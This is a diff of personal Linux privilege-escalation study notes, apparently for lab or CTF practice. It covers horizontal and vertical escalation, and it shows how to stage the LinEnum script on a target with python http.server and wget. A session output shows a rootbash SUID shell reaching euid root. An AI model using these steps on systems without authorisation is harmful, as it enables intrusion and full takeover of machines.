@@ -4,27 +4,24 @@ INTRO
 horizontal privesc
 vertical privesc
 
+https://book.hacktricks.xyz/linux-unix/privilege-escalation  (carlosmpolopm)
+
 linenum
 
 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 
 two ways of uploading:
 1- python server then wget
-
+```basic
 python3 -m http.server 8000
 
 wget <ip>:<port>/<file>
 
 chmod +x <file.sh>
-
+```
 2- copy and paste linenum using Vi or nano , save and add permission
 
-
-
-
-
-
-			###		INDEX
+###		INDEX
 1.  Basic
 2.  Path Variables
 3.  Raptor / mysql
@@ -651,14 +648,6 @@ user@debian:~/tools/privesc-scripts$ /tmp/rootbash -p
 rootbash-4.1# id
 uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 ```
-
-
-
-
-
-
-
-
 
 ### 7 Passwords & Keys
 
